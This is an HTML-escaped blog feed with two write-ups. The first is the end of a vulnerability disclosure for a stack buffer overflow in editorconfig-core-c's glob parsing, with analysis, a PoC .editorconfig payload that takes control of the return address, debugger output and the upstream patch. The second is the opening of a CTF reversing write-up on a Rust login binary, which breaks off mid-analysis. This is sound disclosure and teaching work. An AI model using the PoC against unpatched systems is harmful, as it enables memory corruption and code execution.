            &lt;span class=&quot;n&quot;&gt;strncat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p_pcre&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;right_bracket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;right_bracket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;cm&quot;&gt;/* right_bracket is a bracket */&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;strcat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p_pcre&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;p_pcre&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p_pcre&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;right_bracket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;cm&quot;&gt;/* end of string, meaning that right_bracket is not a
                * bracket. Then we go back one character to make the
                * parsing end normally for the counter in the &quot;for&quot;
                * loop. */&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the most simple way, this part looks for a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;. It will copy from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;]&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p_pcre&lt;/code&gt; if found, or all the remaining characters of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt; if not found. After that, it will update &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p_pcre&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt; to the corresponding amount of copied data.&lt;/p&gt;

&lt;p&gt;We already overflowed into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt;. As we didn’t provide a final &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;]&lt;/code&gt;, it will copy all &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt;, also adding a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;]&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p_pcre&lt;/code&gt; at the end, useful for the following part. That means that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strlen(p_pcre)&lt;/code&gt; will take from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p_pcre&lt;/code&gt; to the end of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt;, but &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt; will be updated only to the right part previously calculated. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Strncat&lt;/code&gt; does not behave well when both pointers are writing one over the other:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;As stayed by the &lt;a href=&quot;https://linux.die.net/man/3/strncat&quot;&gt;strcat documentation&lt;/a&gt;: &lt;em&gt;The strings may not overlap&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;AAAABBBBCCCCDDDDEEEE&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;strncat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;test2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;test2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./a.out                                                                                                                                                 
AAAABBBBCCCCDDDDEEEEAABBAABBBBCCCCDDDDEEEEAABB%    
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is what happens here, more data is written to the buffer than &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;right_bracket - c&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;After the second copy, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt; will always be the previous &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p_pcre&lt;/code&gt; pointer because the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;right_bracket&lt;/code&gt; will be where we added the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;]&lt;/code&gt; in the previous iteration. The pattern repeats as many &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[&lt;/code&gt; as specified, consuming one by iteration. This allows us to write a huge and controlled amount of data to the stack.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Note that the copy will fully depend on the memory state. We may face cases where other characters are copied that may interfere with the script, breaking the loop or returning a fault somewhere else (for example, another crash was detected in free due to overriding the pointer address with garbage)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;After a lot of iterations, we will process the final &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; if no other special char is found due to the memory state. That will trigger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STRING_CAT&lt;/code&gt;, performing the bound checking, noticing that we overflowed and returning directly. This allows us to fully control the stack, even overriding other function stacks.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;We can also stop execution anytime by triggering a copy with the macro that will detect the overflow and call return directly.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;poc&quot;&gt;PoC&lt;/h2&gt;

&lt;p&gt;According to the analysis previously performed, we can create a simple PoC:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt
ene = lf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can then run the PoC like:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;editorconfig /path/to/folder/.editorconfig
&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; stack smashing detected &lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;: terminated
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1]    36421 IOT instruction &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;core dumped&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  editorconfig /path/to/folder/.editorconfig
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After playing around with the offsets, I was able to get the desired values in the right places. Therefore, an attacker can control both the content and the address to write it:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;I provided AAAAAAAA as the return address and BBBBBBBB as the new stack pointer&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  x/1i &lt;span class=&quot;nv&quot;&gt;$rip&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 0x7ffff7fb4fd5 &amp;lt;ec_glob+3253&amp;gt;:	ret    
gef➤  info r &lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$rbp&lt;/span&gt;
rsp            0x7fffffffa1b8      
rbp            0x4242424242424242 
gef➤  x/2wx &lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;
0x7fffffffa1b8:	0x41414141	0x41414141
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;As explained in the analysis, the values should be after the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[[[[[[[[&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Original contents of the PoC to prove exploitability:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[[[|[[[?????????????????????????????????????????????=?????????????????????????????????????????????????????????????????????????\????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????�����������������������������������������������������������������������������������������������������������XXXXXXXXXXXX�����XX[[[[[[[[[[[[[[[[[[[[[n,.is*/XXXXBBBBBBBBAAAAAAAAXXXXAA[*]
ene\c = lf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;proposed-patch&quot;&gt;Proposed patch&lt;/h2&gt;

&lt;p&gt;The issue could be fixed by ensuring that all copied that does not overflow the buffer. For that, I provided the following patch:&lt;/p&gt;

&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gh&quot;&gt;diff --git a/src/lib/ec_glob.c b/src/lib/ec_glob.c
index 32b3941..ea62aee 100644
&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;--- a/src/lib/ec_glob.c
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ b/src/lib/ec_glob.c
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@@ -57,6 +57,13 @@&lt;/span&gt; static const UT_icd ut_int_pair_icd = {sizeof(int_pair),NULL,NULL,NULL};
     p += string_len; \
 } while(0)
 
&lt;span class=&quot;gi&quot;&gt;+/* safely add a char to a string then move the pointer to the end */
+#define ADD_CHAR(string, new_chr, end)  do {    \
+    if (string + 1 &amp;gt;= end) \
+        return -1; \
+    *(string ++) = new_chr; \
+} while(0)
+
&lt;/span&gt; #define PATTERN_MAX  4097
 /*
  * Whether the string matches the given glob pattern. Return 0 if successful, return -1 if a PCRE
&lt;span class=&quot;p&quot;&gt;@@ -131,8 +138,8 @@&lt;/span&gt; int ec_glob(const char *pattern, const char *string)
         case &apos;\\&apos;:      /* also skip the next one */
             if (*(c+1) != &apos;\0&apos;)
             {
&lt;span class=&quot;gd&quot;&gt;-                *(p_pcre ++) = *(c++);
-                *(p_pcre ++) = *c;
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+                ADD_CHAR(p_pcre, *(c++), pcre_str_end);
+                ADD_CHAR(p_pcre, *c, pcre_str_end);
&lt;/span&gt;             }
             else
                 STRING_CAT(p_pcre, &quot;\\\\&quot;, pcre_str_end);
&lt;span class=&quot;p&quot;&gt;@@ -208,18 +215,18 @@&lt;/span&gt; int ec_glob(const char *pattern, const char *string)
                 ++ c;
             }
             else
&lt;span class=&quot;gd&quot;&gt;-                *(p_pcre ++) = &apos;[&apos;;
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+                STRING_CAT(p_pcre, &quot;[&quot;, pcre_str_end);
&lt;/span&gt; 
             break;
 
         case &apos;]&apos;:
             is_in_bracket = 0;
&lt;span class=&quot;gd&quot;&gt;-            *(p_pcre ++) = *c;
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+            ADD_CHAR(p_pcre, *c, pcre_str_end);
&lt;/span&gt;             break;
 
         case &apos;-&apos;:
             if (is_in_bracket)      /* in brackets, - indicates range */
&lt;span class=&quot;gd&quot;&gt;-                *(p_pcre ++) = *c;
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+                ADD_CHAR(p_pcre, *c, pcre_str_end);
&lt;/span&gt;             else
                 STRING_CAT(p_pcre, &quot;\\-&quot;, pcre_str_end);
 
&lt;span class=&quot;p&quot;&gt;@@ -302,12 +309,12 @@&lt;/span&gt; int ec_glob(const char *pattern, const char *string)
             }
 
             -- brace_level;
&lt;span class=&quot;gd&quot;&gt;-            *(p_pcre ++) = &apos;)&apos;;
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+            STRING_CAT(p_pcre, &quot;)&quot;, pcre_str_end);
&lt;/span&gt;             break;
 
         case &apos;,&apos;:
             if (brace_level &amp;gt; 0)  /* , inside {...} */
&lt;span class=&quot;gd&quot;&gt;-                *(p_pcre ++) = &apos;|&apos;;
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+                STRING_CAT(p_pcre, &quot;|&quot;, pcre_str_end);
&lt;/span&gt;             else
                 STRING_CAT(p_pcre, &quot;\\,&quot;, pcre_str_end);
             break;
&lt;span class=&quot;p&quot;&gt;@@ -326,9 +333,9 @@&lt;/span&gt; int ec_glob(const char *pattern, const char *string)
 
         default:
             if (!isalnum(*c))
&lt;span class=&quot;gd&quot;&gt;-                *(p_pcre ++) = &apos;\\&apos;;
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+                STRING_CAT(p_pcre, &quot;\\&quot;, pcre_str_end);
&lt;/span&gt; 
&lt;span class=&quot;gd&quot;&gt;-            *(p_pcre ++) = *c;
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+            ADD_CHAR(p_pcre, *c, pcre_str_end);
&lt;/span&gt;         }
     }
 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;All tests passed and none of the previously discovered crashes worked anymore after the patch.&lt;/p&gt;

&lt;p&gt;The patch landed upstream in commit &lt;a href=&quot;https://github.com/editorconfig/editorconfig-core-c/commit/41281ea82fbf24b060a9f69b9c5369350fb0529e&quot;&gt;41281ea82fbf24b060a9f69b9c5369350fb0529e&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Many thanks to Hong Xu (xuhdev) for the quick response and handling of the issue.&lt;/em&gt;&lt;/p&gt;</content><author><name>David Fernandez</name></author><category term="Exploitation" /><category term="CVE" /><summary type="html"></summary></entry><entry><title type="html">Rusty</title><link href="http://0.0.0.0:4000/2021/09/06/rusty.html" rel="alternate" type="text/html" title="Rusty" /><published>2021-09-06T00:00:00+02:00</published><updated>2021-09-06T00:00:00+02:00</updated><id>http://0.0.0.0:4000/2021/09/06/rusty</id><content type="html" xml:base="http://0.0.0.0:4000/2021/09/06/rusty.html">&lt;pre style=&quot;font-size: 0.8vw; text-align: center&quot;&gt;
                                       ..,                                      
                               .??;   ????.   .??&apos;                              
                        .??&apos;  .???????????????????,  .??;                       
                        ?????????????.;   .?????????????.                       
                  ????.??????????????      .??????????????.???.                 
                  ????????????.,   .?&apos;    ,?.;  ;&apos;.???????????.                 
            .??..????????.,          .????.           .?????????.???,           
            ,?????????.;                                 &apos;??????????            
            .???????&apos;                                       .???????,           
       ,??????????.                                           .??????????       
        .??????????.................................,          ;????????        
        .???????????????????????????????????????????????&apos;        .??????,       
    .?????????????????????????????????????????????????????&apos;       ??????????&apos;   
     .?????????????????????????????????????????????????????.     .?????????&apos;    
     ;???&apos;   ;??&apos;   .????????????,           ;.?????????????    &apos;?&apos;   ,???.     
   &apos;.????     .?.   ;???????????.              ,????????????   ;??     .????.,  
  .??????.;  .?.;   ;???????????.              &apos;???????????     .?.   .???????; 
    .??????.,       ;????????????.&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;.???????????&apos;         ,.???????&apos;   
    .?????.         ;??????????????????????????????????;              ??????.   
 &apos;????????&apos;         ;??????????????????????????????????,              ????????.;
  ;.??????&apos;         ;?????????????........???????????????            ;???????.  
    .?????.         ;????????????            .????????????        ,?????????,   
   &apos;???????         ;???????????.             .???????????.       .??????????;  
  .????????.        .????????????              ????????????.     .????????????. 
     .???????????????????????????????????      .???????????????????????????,    
     ,???????????????????????????????????       ??????????????????????????.     
    .????????????????????????????????????       ,???????????????????????????;   
     ,&apos;.????????????????????????????????.         .?????????????????????..,;    
        &apos;????????;                                             &apos;????????        
        ?????????.    ;,&apos;                              ;,;    &apos;?????????.       
        ....????????.,;.??                            .?.,,.????????.....       
            ,??????.     ?.                          ;?&apos;    ,???????            
            .??????.    &apos;??;                         .?.    .???????;           
            ;,   .???..?????.&apos;;                   ,.?????..????,  ;,            
                  ?????????????????..........?????????????????.                 
                  ?.&apos;  &apos;?????????????????????????????????; ;.?.                 
                        .???..????????????????????...???&apos;                       
                        ;.;    ????, .?????&apos; &apos;???.    ,.                        
                               ;.;    &apos;???     &apos;.                               
                                       ;&apos;                                       
&lt;/pre&gt;

&lt;hr /&gt;

&lt;p&gt;This was a reversing challenge rated with 494 points in GrabCON CTF.&lt;/p&gt;

&lt;p&gt;The instructions said:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Login to this binary and you will get a flag.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As the name suggests, it was compiled with rust which makes the reversing a more interesting task.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;running-the-binary-and-debugging-in-docker&quot;&gt;Running the binary and debugging in Docker&lt;/h2&gt;

&lt;p&gt;When I first ran the program, I got the following error:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;$ ./rusty&lt;/p&gt;

  &lt;p&gt;./rusty: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.33’ not found (required by ./rusty)&lt;/p&gt;

  &lt;p&gt;./rusty: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32’ not found (required by ./rusty)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;After some research, I found out that the problem was that the binary was compiled on Ubuntu 21.04 and that there wasn’t any quick way to install GLIBC 2.32 on Ubuntu 20.04.&lt;/p&gt;

&lt;p&gt;My first thought was Docker. So I pulled the image ubuntu:21.04 and it ran smoothly.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;$ sudo docker run -v $PWD:/Data -it ubuntu:21.04 bash&lt;/p&gt;

  &lt;p&gt;root@a62fe0f60097:/# ./Data/rusty&lt;/p&gt;

  &lt;p&gt;Username : test&lt;/p&gt;

  &lt;p&gt;Password : test&lt;/p&gt;

  &lt;p&gt;Go away you fool&lt;/p&gt;

  &lt;p&gt;root@a62fe0f60097:/#&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;One trick I learned a year ago is that you can actually debug code running on a Docker container by avoiding the creation of a new PID namespace and using the one from the host. This can be accomplished by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--pid=host&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This way you can see it from the debugger and attach it to it.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;There are probably more ways to accomplish it but this one works for me. Let me know if you know others!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;first-look&quot;&gt;First look&lt;/h2&gt;

&lt;p&gt;When we first open it, we can see it is a large file of 7.69MB written in Rust.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/rusty-dashboard.png&quot; alt=&quot;dashboard&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We look for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; function and we can see it calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dbg.main&lt;/code&gt; so let’s open that one.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/rusty-main.png&quot; alt=&quot;main&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At first sight, it looks intimidating. We can try to spot where the user and password are being read and try to move forward from there.&lt;/p&gt;

&lt;p&gt;When approaching the first conditional jump we can see that a new vector is created with the string “01DU53r” and it is compared to the username we send.&lt;/p&gt;

&lt;p&gt;If we debug it and send AAAAAAAAAA as the username and BBBBBBBBBBB as the password we can see that the username is being compared with 01DU53r.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/rusty-username.png&quot; alt=&quot;username&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now let’s move to the password. After the username check, we can see that an iterator is being created and a conditional jump is right after it. So we know that there is some for loop which in the graph is the big chunk of code from the left.&lt;/p&gt;

&lt;p&gt;Let’s take a look at this part.&lt;/p&gt;

&lt;h2 id=&quot;weird-loop&quot;&gt;Weird loop&lt;/h2&gt;

&lt;p&gt;After looking a bit at the blocks we can notice a pattern: a variable amount of times a sum and division occurs and then a call is made to one of the following functions: rusty::x::RANDOM, rusty::y::RANDOM and rusty::z::RANDOM. After the call, a push is being made to a different vector each time.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/rusty_div.png&quot; alt=&quot;div&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/rusty_call.png&quot; alt=&quot;call&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can also notice that, in the end, the loop is broken but if we debug we can see that it finally returns to the beginning.&lt;/p&gt;

&lt;p&gt;Let’s debug it to check what is happening. We will send the alphabet as the password so we can quickly spot the values.&lt;/p&gt;

&lt;p&gt;So in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x&lt;/code&gt; call, we have 1 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;add&lt;/code&gt; block and 2 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;div&lt;/code&gt; blocks. When we check the arguments being passed to the function call we can see that 0x41 and 0x43 are loaded into the registers.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/rusty-debug-call.png&quot; alt=&quot;call&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It looks like the add and div are just the calculations of an index of our password. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;div&lt;/code&gt; is just a way to achieve modular calculation so the index doesn’t overflow. Let’s reverse the x, y and z call to see what they are doing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/rusty-x.png&quot; alt=&quot;x&quot; /&gt;&lt;/p&gt;

&lt;p&gt;X looks very simple. Just and add nothing else.&lt;/p&gt;

&lt;p&gt;Let’s check the arguments that y receives.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/rusty-debug-y.png&quot; alt=&quot;y-debug&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see that we are using 0x41, 0x44 and 0x46 in our case which are [0], [+3] and [+5] which match the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;add&lt;/code&gt; blocks we can see above the function.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/rusty-y.png&quot; alt=&quot;y&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y has a little bit more operations. The result would be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(al ^ dl) | cl&lt;/code&gt; which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;([0] ^ [3]) | [4])&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;And finally z, which doesn’t show in the graph (Cutter bug I guess) but we can get there in the assembly view.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/rusty-debug-z.png&quot; alt=&quot;z-debug&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see that we are using 0x41, 0x42, 0x43 and 0x44 in our case which are [0], [+1], [+2] and [+3] which match the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;add&lt;/code&gt; blocks we can see above the function.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/rusty-z.png&quot; alt=&quot;z&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this case, this is the most complex of all of them. The calculation is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(al + cl) ^ (cl | dl)&lt;/code&gt; which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;([0] + [1]) ^ ([2] | [3])&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Now that we know what it’s happening here let’s see what the program does with the results.&lt;/p&gt;

&lt;h2 id=&quot;password-check&quot;&gt;Password check&lt;/h2&gt;

&lt;p&gt;When the previous loop ends, a vector with a lot of data is created. The length is 36.&lt;/p&gt;

